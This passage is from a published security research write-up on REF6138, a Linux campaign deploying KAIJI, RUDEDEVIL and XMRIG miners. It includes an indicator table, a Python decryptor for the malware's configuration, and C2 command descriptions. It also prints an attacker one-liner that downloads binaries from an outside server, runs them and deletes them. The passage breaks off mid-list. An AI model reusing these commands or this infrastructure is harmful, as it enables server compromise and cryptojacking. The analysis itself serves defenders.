practices. Engaging professional security auditors to review your code can help identify and mitigate vulnerabilities before they are exploited.\n8. **Regularly Patch and Update Systems**: Keeping servers, applications, and software up to date is essential to defending against known vulnerabilities. Prompt patching minimizes the risk of being targeted by off-the-shelf exploits.\n\nBy following these recommendations, you can significantly reduce the attack surface and strengthen your defense against ongoing or potential malware threats.\n\n## Observations\n\nThe following observables were discussed in this research. These are available for download in STIX or ECS format [here](https://github.com/elastic/labs-releases/tree/main/indicators/ref6138).\n\n| Observable                                                                                      | Type        | Name                   | Reference                          |\n|-------------------------------------------------------------------------------------------------|-------------|------------------------|------------------------------------|\n| 72ac2877c9e4cd7d70673c0643eb16805977a9b8d55b6b2e5a6491db565cee1f                                | SHA-256     | SystemdXC              | XMRIG                              |\n| 82c55c169b6cb5e348be6e202163296b2b5d80fff2be791c21da9a8b84188684                                | SHA-256     | apache2                | apache2_unpacked                   |\n| 0fede7231267afc03b096ee6c1d3ded479b10ab235e260120bc9f68dd1fc54dd                                | SHA-256     | apache2_upx_packed     | apache2_upx_packed                 |\n| 9ee695e55907a99f097c4c0ad4eb24ae5cf3f8215e9904d787817f1becb9449e                                | SHA-256     | download.sh            | KAIJI Stager                       |\n| 1cdfb522acb1ad0745a4b88f072e40bf9aa113b63030fe002728bac50a46ae79                                | SHA-256     | linux_386              | KAIJI x86                          |\n| d0ef2f020082556884361914114429ed82611ef8de09d878431745ccd07c06d8                                | SHA-256     | linux_amd64            | KAIJI x64                          |\n| ad36cf59b5eb08799a50e9aece6f12cdfe8620062606ac6684d3b4509acc681b                                | SHA-256     | linux_arm5             | KAIJI ARM5                         |\n| 792a84a5bc8530285e2f6eb997054edb3d43460a99a089468e2cf81b5fd5cde6                                | SHA-256     | linux_arm6             | KAIJI ARM6                         |\n| e19fb249db323d2388e91f92ff0c8a7a169caf34c3bdaf4d3544ce6bfb8b88b4                                | SHA-256     | linux_arm64            | KAIJI ARM64                        |\n| 3847c06f95dd92ec482212116408286986bb4b711e27def446fb4a524611b745                                | SHA-256     | linux_arm7             | KAIJI ARM7                         |\n| fffee23324813743b8660282ccd745daa6fb058f2bf84b9960f70d888cd33ba0                                | SHA-256     | linux_mips             | KAIJI MIPS                         |\n| 6d40b58e97c7b4c34f7b5bdac88f46e943e25faa887e0e6ce5f2855008e83f55                                | SHA-256     | linux_mips64           | KAIJI MIPS64                       |\n| 0c3442b8c49844a1ee41705a9e4a710ae3c7cde76c69c2eab733366b2aa34814                                | SHA-256     | linux_mips64el         | KAIJI MIPS64 little-endian         |\n| 310973f6f186947cb7cff0e7b46b4645acdd71e90104f334caa88a4fa8ad9988                                | SHA-256     | linux_mips_softfloat   | KAIJI MIPS softfloat               |\n| 0d24a2e7da52bad03b0bda45c8435a29c4e1c9b483e425ae71b79fd122598527                                | SHA-256     | linux_mipsel           | KAIJI MIPS little-endian           |\n| 36fc8eef2e1574e00ba3cf9e2267d4d295f6e9f138474e3bd85eb4d215f63196                                | SHA-256     | linux_mipsel_softfloat | KAIJI MIPS little-endian softfloat |\n| 3c25a4406787cc5089e83e00350e49eb9f192d03d69e7a61b780b6828db1344f                                | SHA-256     | linux_ppc64            | KAIJI PPC64                        |\n| 7c16149db7766c6fd89f28031aa123408228f045e90aa03828c02562d9f9d1d7                                | SHA-256     | linux_ppc64el          | KAIJI PPC64 little-endian          |\n| 09f935acbac36d224acfb809ad82c475d53d74ab505f057f5ac40611d7c3dbe7                                | SHA-256     | l64_v0                 | RUDEDEVIL/LUFICER x64 version 0    |\n| ea0068702ea65725700b1dad73affe68cf29705c826d12a497dccf92d3cded46                                | SHA-256     | l64_v1                 | RUDEDEVIL/LUFICER x64 version 1    |\n| 160f232566968ade54ee875def81fc4ca69e5507faae0fceb5bef6139346496a                                | SHA-256     | l64_v2                 | RUDEDEVIL/LUFICER x64 version 2    |\n| 89b60cedc3a4efb02ceaf629d6675ec9541addae4689489f3ab8ec7741ec8055                                | SHA-256     | l64_v3                 | RUDEDEVIL/LUFICER x64 version 3    |\n| 20899c5e2ecd94b9e0a8d1af0114332c408fb65a6eb3837d4afee000b2a0941b                                | SHA-256     | l86_v0                 | RUDEDEVIL/LUFICER x86 version 0    |\n| 728dce11ffd7eb35f80553d0b2bc82191fe9ff8f0d0750fcca04d0e77d5be28c                                | SHA-256     | l86_v1                 | RUDEDEVIL/LUFICER x86 version 1    |\n| 47ceca049bfcb894c9a229e7234e8146d8aeda6edd1629bc4822ab826b5b9a40                                | SHA-256     | l86_v2                 | RUDEDEVIL/LUFICER x86 version 2    |\n| e89f4073490e48aa03ec0256d0bfa6cf9c9ac6feb271a23cb6bc571170d1bcb5                                | SHA-256     | l86_v3                 | RUDEDEVIL/LUFICER x86 version 3    |\n| d6350d8a664b3585108ee2b6f04f031d478e97a53962786b18e4780a3ca3da60                                | SHA-256     | hjvhg.exe              | Miner                              |\n| 54a5c82e4c68c399f56f0af6bde9fb797122239f0ebb8bcdb302e7c4fb02e1de                                | SHA-256     | mvhhvcp3.exe           | DONUT LOADER                       |\n| 9e32be17b25d3a6c00ebbfd03114a0947361b4eaf4b0e9d6349cbb95350bf976                                | SHA-256     | vdfgb.exe              | Miner                              |\n| http://gcp.pagaelrescate[.]com:8080/ifindyou                                                    | url         | ifindyou.sh            | Stage 1                            |\n| http://gcp.pagaelrescate[.]com:8080/cycnet                                                      | url         | cycnet.sh              | Stage 2                            |\n| http://gcp.pagaelrescate[.]com:8080/testslot/enviador_slot                                      | url         | Enviador_slot.py       | Stage 3                            |\n| http://gcp.pagaelrescate[.]com:8080/t9r/SystemdXC                                               | url         | SystemdXC              | XMRIG                              |\n| http://38.54.125[.]192:8080/nginx-rc                                                            | url         | nginx-rc               | LIGOLO-NG                          |\n| http://62.72.22[.]91/apache2                                                                    | url         | apache2                | Custom Malware                     |\n| http://62.72.22[.]91/apache2v86                                                                 | url         | apache2v86             | Custom Malware                     |\n| http://91.92.241[.]103:8002/gk.php                                                              | url         | gk.php                 | PHP Backdoor                       |\n| http://hfs.t1linux[.]com:7845/scdsshfk                                                          | url         | scdsshfk               | XMRIG                              |\n| gcp.pagaelrescate[.]com                                                                         | domain-name |                        | REF Hosting domain                 |\n| nishabii[.]xyz                                                                                  | domain-name |                        | RUDEDEVIL C2                       |\n| 3.147.53[.]183                                                                                  | ipv4-addr   |                        | Python Reverse Shell C2            |\n| 38.54.125[.]192                                                                                 | ipv4-addr   |                        | C2 Server                          |\n| 107.178.101[.]245                                                                               | ipv4-addr   |                        | Malware File Server (Rejetto)      |\n| 62.72.22[.]91                                                                                   | ipv4-addr   |                        | Server Hosting Malware             |\n| 91.92.241[.]103                                                                                 | ipv4-addr   |                        | C2 Server                          |\n| 61.160.194[.]160                                                                                | ipv4-addr   |                        | Server Hosting Malware             |\n| 41qBGWTRXUoUMGXsr78Aie3LYCBSDGZyaQeceMxn11qi9av1adZqsVWCrUwhhwqrt72qTzMbweeqMbA89mnFepja9XERfHL | XMR Wallet  |                        | RUDEDEVIL/LUFICER mining wallet    |\n| 42CJPfp1jJ6PXv4cbjXbBRMhp9YUZsXH6V5kEvp7XzNGKLnuTNZQVU9bhxsqBEMstvDwymNSysietQ5VubezYfoq4fT4Ptc | XMR Wallet  |                        | RUDEDEVIL/LUFICER mining wallet    |\n| 1CSUkd5FZMis5NDauKLDkcpvvgV1zrBCBz                                                              | BTC Wallet  |                        | XMRIG mining wallet                |\n\n## References\n\nThe following were referenced throughout the above research:\n\n* [https://www.trendmicro.com/en_us/research/20/f/xorddos-kaiji-botnet-malware-variants-target-exposed-docker-servers.html](https://www.trendmicro.com/en_us/research/20/f/xorddos-kaiji-botnet-malware-variants-target-exposed-docker-servers.html)\n* [https://blog.lumen.com/chaos-is-a-go-based-swiss-army-knife-of-malware/](https://blog.lumen.com/chaos-is-a-go-based-swiss-army-knife-of-malware/)\n* [https://www.fortinet.com/blog/threat-research/multiple-threats-target-adobe-coldfusion-vulnerabilities](https://www.fortinet.com/blog/threat-research/multiple-threats-target-adobe-coldfusion-vulnerabilities)\n* [https://www.aquasec.com/blog/lucifer-ddos-botnet-malware-is-targeting-apache-big-data-stack/](https://www.aquasec.com/blog/lucifer-ddos-botnet-malware-is-targeting-apache-big-data-stack/)\n* [https://github.com/hackerschoice/gsocket](https://github.com/hackerschoice/gsocket)","code":"var Component=(()=\u003e{var h=Object.create;var a=Object.defineProperty;var p=Object.getOwnPropertyDescriptor;var m=Object.getOwnPropertyNames;var u=Object.getPrototypeOf,g=Object.prototype.hasOwnProperty;var f=(t,e)=\u003e()=\u003e(e||t((e={exports:{}}).exports,e),e.exports),b=(t,e)=\u003e{for(var i in e)a(t,i,{get:e[i],enumerable:!0})},c=(t,e,i,o)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let r of m(e))!g.call(t,r)\u0026\u0026r!==i\u0026\u0026a(t,r,{get:()=\u003ee[r],enumerable:!(o=p(e,r))||o.enumerable});return t};var w=(t,e,i)=\u003e(i=t!=null?h(u(t)):{},c(e||!t||!t.__esModule?a(i,\"default\",{value:t,enumerable:!0}):i,t)),y=t=\u003ec(a({},\"__esModule\",{value:!0}),t);var d=f((I,s)=\u003e{s.exports=_jsx_runtime});var T={};b(T,{default:()=\u003ek,frontmatter:()=\u003ev});var n=w(d()),v={title:\"Betting on Bots: Investigating Linux malware, crypto mining, and gambling API abuse\",slug:\"betting-on-bots\",date:\"2024-09-27\",description:\"The REF6138 campaign involved cryptomining, DDoS attacks, and potential money laundering via gambling APIs, highlighting the attackers' use of evolving malware and stealthy communication channels.\",author:[{slug:\"remco-sprooten\"},{slug:\"ruben-groenewoud\"}],image:\"betting-on-bots.jpg\",category:[{slug:\"malware-analysis\"},{slug:\"attack-pattern\"}],tags:[\"linux\",\"kaiji\",\"rudedevil\",\"gsocket\",\"cryptomining\"]};function l(t){let e=Object.assign({h2:\"h2\",p:\"p\",h3:\"h3\",code:\"code\",ul:\"ul\",li:\"li\",img:\"img\",pre:\"pre\",strong:\"strong\",h4:\"h4\",a:\"a\",em:\"em\",div:\"div\",table:\"table\",thead:\"thead\",tr:\"tr\",th:\"th\",tbody:\"tbody\",td:\"td\",ol:\"ol\"},t.components);return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)(e.h2,{id:\"introduction\",children:\"Introduction\"}),`\n`,(0,n.jsx)(e.p,{children:\"In recent months, Elastic Security Labs has uncovered a sophisticated Linux malware campaign targeting vulnerable servers. The attackers initiated the compromise in March 2024 by exploiting an Apache2 web server. Gaining initial access the threat actors deployed a complex intrusion set to establish persistence and expand their control over the compromised host.\"}),`\n`,(0,n.jsx)(e.p,{children:\"The threat actors utilized a mixture of tools and malware, including C2 channels disguised as kernel processes, telegram bots for communication, and cron jobs for scheduled task execution. Notably, they deployed multiple malware families, such as KAIJI and RUDEDEVIL, alongside custom-written malware. KAIJI, known for its DDoS capabilities, and RUDEDEVIL, a cryptocurrency miner, were used to exploit system resources for malicious purposes.\"}),`\n`,(0,n.jsx)(e.p,{children:\"Our investigation revealed a potential Bitcoin/XMR mining scheme that leverages gambling APIs, suggesting the attackers might be conducting money laundering activities using compromised hosts. We also gained access to a file share that hosted daily uploads of fresh KAIJI samples with previously unseen hashes, indicating active development and adaptation by the malware authors.\"}),`\n`,(0,n.jsx)(e.p,{children:\"This research publication delves into the details of the campaign, providing a comprehensive analysis of the attackers' tactics, techniques, and procedures. We explore how they established initial access, the methods used for persistence and privilege escalation, and the malware deployed at each stage. Additionally, we discuss the command and control infrastructure, including the use of GSOCKET and Telegram for stealthy communication.\"}),`\n`,(0,n.jsx)(e.h2,{id:\"execution-flow\",children:\"Execution flow\"}),`\n`,(0,n.jsx)(e.h3,{id:\"initial-access\",children:\"Initial access\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Our team observed a host that was initially compromised in March 2024 by obtaining arbitrary code execution on a server running Apache2. Evidence of this compromise is seen in the execution of the \",(0,n.jsx)(e.code,{children:\"id\"}),\" command via the Apache2 process, after which we see the threat actor exploiting the web server and deploying KAIJI malware under the \",(0,n.jsx)(e.code,{children:\"www-data\"}),\" user account.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Shortly after the Kaiji deployment, the attacker used the \",(0,n.jsx)(e.code,{children:\"www-data\"}),\" account to download a script named \",(0,n.jsx)(e.code,{children:\"00.sh\"}),\" from the URL \",(0,n.jsx)(e.code,{children:\"http://61.160.194[.]160:35130\"}),\", which, after further investigation, also hosted several versions of RUDEDEVIL malware.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[(0,n.jsx)(e.code,{children:\"00.sh\"}),\" is a stager that:\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:\"Sets its default shell and PATH.\"}),`\n`,(0,n.jsx)(e.li,{children:\"Deletes several log files to erase traces of execution.\"}),`\n`,(0,n.jsxs)(e.li,{children:[\"Leverages \",(0,n.jsx)(e.code,{children:\"ps\"}),\", \",(0,n.jsx)(e.code,{children:\"netstat\"}),\", \",(0,n.jsx)(e.code,{children:\"lsof\"}),\" and a list of common mining process names to kill any potential mining competition on the compromised host.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Flushes the \",(0,n.jsx)(e.code,{children:\"iptables\"}),\" rules on the host, sets several \",(0,n.jsx)(e.code,{children:\"iptables\"}),\" rules to block connections to specific destination ports and mining pools, and disables \",(0,n.jsx)(e.code,{children:\"iptables\"}),\".\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Finally, a second stage (\",(0,n.jsx)(e.code,{children:\"sss6\"}),\"/\",(0,n.jsx)(e.code,{children:\"sss68\"}),\") is downloaded and executed, and execution traces are erased.\"]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"The figure below shows a compressed version of the stager. Lines annotated with \",(0,n.jsx)(e.code,{children:\"[...]\"}),\" are shortened to enhance readability.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image5.png\",alt:\"Compressed version of the 00.sh stager\",title:\"Compressed version of the 00.sh stager\",width:\"1999\",height:\"1721\"})}),`\n`,(0,n.jsx)(e.h3,{id:\"fileserver\",children:\"Fileserver\"}),`\n`,(0,n.jsx)(e.p,{children:\"Via the backdoored web server process, the attacker downloaded and executed malware through the following command:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`sh -c wget http://107.178.101[.]245:5488/l64;chmod 777 l64;./l64;rm -r l64;wget http://107.178.101[.]245:5488/l86;chmod 777 l86;./l86;rm -r l86\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"The \",(0,n.jsx)(e.code,{children:\"l64\"}),\" and \",(0,n.jsx)(e.code,{children:\"l86\"}),\" files are downloaded from \",(0,n.jsx)(e.code,{children:\"http://107.178.101[.]245:5488\"}),\", after which they are granted all permissions, executed, and removed. Looking at the server that is hosting these malware samples, we see the following:\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image30.png\",alt:\"Rejetto File Server Hosting Several Pieces of Malware\",title:\"Rejetto File Server Hosting Several Pieces of Malware\",width:\"1797\",height:\"1377\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"This seems to be a file server, hosting several types of malware for different architectures. The file server leverages the Rejetto technology. These malwares have upload dates and download counters. For example, the \",(0,n.jsx)(e.code,{children:\"download.sh\"}),\" file that was uploaded September 10th, was already downloaded 3,100 times.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image25.png\",alt:\"Download Counter Indicating 3000+ Downloads Within 2 Weeks of Upload\",title:\"Download Counter Indicating 3000+ Downloads Within 2 Weeks of Upload\",width:\"1704\",height:\"393\"})}),`\n`,(0,n.jsx)(e.h3,{id:\"rudedevillucifer\",children:\"RUDEDEVIL/LUCIFER\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Upon closer inspection, the file \",(0,n.jsx)(e.code,{children:\"sss6\"}),\", which was downloaded and executed, has been identified as the RUDEDEVIL malware. Early in the execution process, we encounter an embedded message characteristic of this malware family:\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image11.png\",alt:\"RUDEDEVIL Malware Characteristic\",title:\"RUDEDEVIL Malware Characteristic\",width:\"1999\",height:\"173\"})}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`Hi, man. I\\\\'ve seen several organizations report my Trojan recently, \nPlease let me go. I want to buy a car. That\\\\'s all. I don\\\\'t want to hurt others. \nI can\\\\'t help it. My family is very poor. In China, it\\\\'s hard to buy a suite. \nI don\\\\'t have any accommodation. I don\\\\'t want to do anything illegal. \nReally, really, interested, you can give me XmR, my address is 42cjpfp1jJ6pxv4cbjxbbrmhp9yuzsxh6v5kevp7xzngklnutnzqvu9bhxsqbemstvdwymnsysietq5vubezyfoq4ft4ptc, \nthank yo\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"We note that the files \",(0,n.jsx)(e.code,{children:\"l64\"}),\" and \",(0,n.jsx)(e.code,{children:\"l86\"}),\" that are hosted on the file server contain the same malware. When analyzing the execution flow of the malware we see that the main function of the malware performs several key tasks:\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Daemon Initialization:\"}),\" The process is converted into a daemon using \",(0,n.jsx)(e.code,{children:\"daemon(1, 0)\"}),\".\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Socket Creation:\"}),\" A socket is created and bound to a specific port.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Signal Handling:\"}),\" Custom signal handlers are set up for various signals.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Service Initialization:\"}),\" Several services are started using \",(0,n.jsx)(e.code,{children:\"SetFILE\"}),\".\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Privilege Handling:\"}),\" It checks for root privileges and adjusts resource limits accordingly.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Decryption:\"}),\" The malware decrypts its configuration blobs.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Thread Creation:\"}),\" Multiple threads are spawned for tasks like mining, killing processes, and monitoring network and CPU usage.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Main Loop:\"}),\" The program enters an infinite loop where it repeatedly connects to a server and sleeps for a specified duration.\"]}),`\n`]}),`\n`,(0,n.jsx)(e.p,{children:\"When examining the encryption routine, we find it utilizes XOR-based encoding:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image13.png\",alt:\"DareDevil Encryption Routine\",title:\"DareDevil Encryption Routine\",width:\"1164\",height:\"610\"})}),`\n`,(0,n.jsx)(e.p,{children:\"To decode the contents statically, we developed a basic Python snippet:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-python\",children:`def DecryptData(data_block, encryption_key):\n   key_modifier = encryption_key \u0026 0xFF\n   key_index = key_modifier // 0x5F  # 0x5F = 95 in decimal\n   modifier = (key_modifier - (key_index * 0x5F)) + 0x58  # 0x58 = 88 in decimal\n\n   for i in range(len(data_block)):\n       data_block[i] ^= modifier\n       data_block[i] \u0026= 0xFF  # Ensure 8-bit value\n       data_block[i] += modifier\n       data_block[i] \u0026= 0xFF  # Ensure 8-bit value\n\n   return data_block\n\n# Encoded data as hex strings\nencoded_data = [\n   '4c494356515049490c467978',\n   '0d4f1e4342405142454d0b42534e380f0f5145424f0c53034e4f4f4a0c4f40573801393939391e0d451e020141303727222026254f252d372643400706314955032a593330233237587951215553552d464c0101414939514401515258414324273340254756564741404207004122782d50475555412d503106394d4c34554e48513926352054362a1e0d4e1e20',\n   '0f424d4e0f435536575649484b',\n   '5642424e380f0f5654430c42014a494c45460c534f4d38070602050f435352434356544b',\n]\n\nencryption_key = 0x03FF  # 1023 in decimal\n\n# Process and decrypt each encoded data string\nfor data in encoded_data:\n   # Convert hex string to list of integers\n   data_bytes = bytes.fromhex(data)\n   data_block = list(data_bytes)\n\n   # Decrypt the data\n   decrypted_block = DecryptData(data_block, encryption_key)\n\n   # Convert decrypted data back to bytes\n   decrypted_bytes = bytes(decrypted_block)\n   print(\"Decrypted text:\", decrypted_bytes.decode('utf-8', errors='ignore'))\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"After decoding the configuration, the following values are revealed:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[\"The first value C2 domain \",(0,n.jsx)(e.code,{children:\"nishabii[.]xyz\"}),\".\"]}),`\n`,(0,n.jsx)(e.li,{children:\"The second value reveals options that will be passed to XMRIG.\"}),`\n`,(0,n.jsx)(e.li,{children:\"The third value shows the temp file location the malware uses.\"}),`\n`,(0,n.jsx)(e.li,{children:\"The fourth and last string shows the download location for the XMRIG binary.\"}),`\n`]}),`\n`,(0,n.jsx)(e.h3,{id:\"thread-management-in-the-malware\",children:\"Thread Management in the Malware\"}),`\n`,(0,n.jsx)(e.p,{children:\"The malware initiates several threads to handle its core operations. Let\\u2019s explore how some of these functions work in detail.\"}),`\n`,(0,n.jsx)(e.h4,{id:\"understanding-the-killpid-function\",children:\"Understanding the KillPid Function\"}),`\n`,(0,n.jsx)(e.p,{children:\"One of the threads runs the KillPid function, which is designed to continuously monitor and manage processes. The function begins by detaching its current thread, allowing it to run in the background without blocking other processes. It then enters an infinite loop, repeatedly executing its tasks.\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"At the heart of its functionality is an array called \",(0,n.jsx)(e.code,{children:\"sb_name\"}),\", which contains the names of processes the malware wants to terminate.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image24.png\",alt:\"RUDEDEVIL kill process array\",title:\"RUDEDEVIL kill process array\",width:\"1840\",height:\"324\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Every two seconds, the function checks the system for processes listed in this array, retrieving their process IDs (PIDs) using a helper function called \",(0,n.jsx)(e.code,{children:\"getPidByName\"}),\". After each iteration, it moves to the next process in the list, ensuring all processes in \",(0,n.jsx)(e.code,{children:\"sb_name\"}),\" are handled.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Interestingly, after processing all elements in the array, the function enters an extended sleep for 600 seconds \\u2014 roughly 10 minutes \\u2014 before resuming its process checks. This extended sleep period is likely implemented to conserve system resources, ensuring the malware doesn't consume too much CPU time while monitoring processes.\"}),`\n`,(0,n.jsx)(e.h4,{id:\"understanding-the-get_net_messages-function\",children:\"Understanding the Get_Net_Messages Function\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Another crucial thread is responsible for monitoring network traffic, specifically focusing on the \",(0,n.jsx)(e.code,{children:\"eth0\"}),\" network interface. This functionality is handled by the \",(0,n.jsx)(e.code,{children:\"getOutRates\"}),\" function. The function begins by setting up necessary variables and opening the \",(0,n.jsx)(e.code,{children:\"/proc/net/dev\"}),\" file, which contains detailed network statistics for each interface.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image22.png\",alt:\"Getting network rates from /proc/net/dev\",title:\"Getting network rates from /proc/net/dev\",width:\"1184\",height:\"544\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"If the file is successfully opened, the malware reads a block of data \\u2014 up to 1024 bytes \\u2014 and processes it to extract the relevant network statistics. It specifically looks for the \",(0,n.jsx)(e.code,{children:\"eth0\"}),\" interface, parsing the output rate data using a standard string parsing method. If successful, the function returns the output rate for \",(0,n.jsx)(e.code,{children:\"eth0\"}),\"; otherwise, it returns \",(0,n.jsx)(e.code,{children:\"0\"}),\", ensuring the malware continues functioning even if an error occurs.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"This routine allows the malware to quietly monitor the network activity of the infected machine, likely to track data being sent or received across the interface.\"}),`\n`,(0,n.jsx)(e.h4,{id:\"understanding-the-get_cpu_message-function\",children:\"Understanding the Get_Cpu_Message Function\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"For CPU monitoring, the malware uses the \",(0,n.jsx)(e.code,{children:\"GetCpuRates\"}),\" function. This function continuously monitors the CPU usage by reading data from \",(0,n.jsx)(e.code,{children:\"/proc/stat\"}),\". Similar to how the network data is handled, the CPU statistics are read and parsed, allowing the malware to calculate the system's CPU usage.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image34.png\",alt:\"Getting CPU information from /proc/stat\",title:\"Getting CPU information from /proc/stat\",width:\"1184\",height:\"544\"})}),`\n`,(0,n.jsx)(e.p,{children:\"The function operates in an infinite loop, sleeping for one second between each iteration to avoid overwhelming the system. If the file cannot be opened for some reason, the function logs an error and gracefully exits. However, as long as it\\u2019s able to read the file, it continually monitors CPU usage, ensuring the malware remains aware of system performance.\"}),`\n`,(0,n.jsx)(e.h4,{id:\"understanding-the-send_host_message-function\",children:\"Understanding the Send_Host_Message Function\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Perhaps the most critical thread is the one responsible for sending system information back to the malware operators. The \",(0,n.jsx)(e.code,{children:\"_SendInfo\"}),\" function performs this task by collecting data about the infected system\\u2019s CPU and network usage. It begins by setting up buffers and preparing file paths to gather the necessary data. Depending on the system\\u2019s status, it formats the CPU and network usage into a string.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image19.png\",alt:\"Sending system info back to the C2\",title:\"Sending system info back to the C2\",width:\"1304\",height:\"1520\"})}),`\n`,(0,n.jsx)(e.p,{children:\"Additionally, the function checks whether a particular process is running on the system and adjusts its formatted message accordingly. Finally, it sends this formatted data back to the command-and-control server via a socket connection.\"}),`\n`,(0,n.jsx)(e.p,{children:\"In essence, this function allows the malware to remotely monitor the infected machine, gathering key details like CPU load and network activity. The operators can use this information to assess the status of their infection and adjust their activities as needed.\"}),`\n`,(0,n.jsx)(e.h3,{id:\"connecting-to-the-command-and-control-c2-server\",children:\"Connecting to the Command-and-Control (C2) Server\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Once all the threads are up and running, the malware shifts its focus to establishing a connection with its C2 server. This is managed by the \",(0,n.jsx)(e.code,{children:\"ConnectServer\"}),\" function in the main thread, which handles communication with the server and executes commands remotely.\"]}),`\n`,(0,n.jsx)(e.h4,{id:\"understanding-the-connectserver-function\",children:\"Understanding the ConnectServer Function\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"The first task the \",(0,n.jsx)(e.code,{children:\"ConnectServer\"}),\" function performs is establishing a connection to the C2 server using \",(0,n.jsx)(e.code,{children:\"ServerConnectCli\"}),\". After successfully connecting, the malware configures the socket to enable keep-alive settings, ensuring that the connection remains stable over extended periods of time.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Once the connection is set up, the malware collects various pieces of system information, including the hostname, user information, CPU specs, and memory details. This information is then sent to the server as an initial data payload, providing the attackers with a detailed view of the infected machine.\"}),`\n`,(0,n.jsx)(e.p,{children:\"After this initial setup, the malware enters an ongoing loop where it awaits and processes commands from the server. The types of commands handled are varied and can include tasks like launching a DDoS attack, stopping or starting CPU-intensive operations, executing system commands, or managing cryptocurrency mining activities. The loop continues indefinitely, ensuring that the malware is ready to execute any command sent by its operators.\"}),`\n`,(0,n.jsx)(e.p,{children:\"When the connection is no longer needed, or when the malware receives a termination command, it gracefully closes the socket, ending the session with the server.\"}),`\n`,(0,n.jsx)(e.h4,{id:\"command-and-control-c2-commands\",children:\"Command-and-Control (C2) Commands\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"The \",(0,n.jsx)(e.code,{children:\"ConnectServer\"}),\" function processes a variety of commands from the C2 server, each designed to control a different aspect of the infected system. Here\\u2019s a breakdown of the commands handled by the malware:\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Case 4:\"}),\" The malware calls the \",(0,n.jsx)(e.code,{children:\"DealwithDDoS\"}),\" function, likely initiating a Distributed Denial of Service (DDoS) attack.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Case 5:\"}),\" Sets the \",(0,n.jsx)(e.code,{children:\"StopFlag\"}),\" to \",(0,n.jsx)(e.code,{children:\"1\"}),\", which could signal the malware to stop specific tasks.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Case 6:\"}),\" Downloads a file from the server using \",(0,n.jsx)(e.code,{children:\"http_get\"}),\", changes its permissions, and then executes it. This command allows the attackers to run additional malware or scripts on the infected machine.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Case 7:\"}),\" Executes a system command using the \",(0,n.jsx)(e.code,{children:\"system\"}),\" function, providing the attackers with direct control over the system\\u2019s command line.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Case 8:\"}),\" Sets \",(0,n.jsx)(e.code,{children:\"StopCpu\"}),\" to \",(0,n.jsx)(e.code,{children:\"0\"}),\", restarting any previously halted CPU tasks.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Case 9:\"}),\" Sets 